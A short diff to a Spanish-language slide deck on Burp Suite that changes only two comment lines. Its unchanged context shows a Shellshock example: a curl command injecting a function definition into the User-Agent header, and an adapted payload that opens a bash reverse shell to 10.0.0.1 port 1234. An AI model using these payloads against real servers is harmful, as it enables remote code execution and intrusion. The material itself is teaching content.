@@ -42,12 +42,12 @@ paginate: true
 ### Ejemplo de uso
 En burpsuite se podrían ocupar en ataques como Shellshock, por ejemplo:
 ```
-# Se ocupa como base un proceso como este...
+#Se ocupa como base un proceso como este...
 
 curl -H "User-Agent: () { :; }; /bin/eject" http://example.com/
 ```
 ```
-# Acá se adapta el proceso...
+#Acá se adapta el proceso...
 
 User Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
 ```
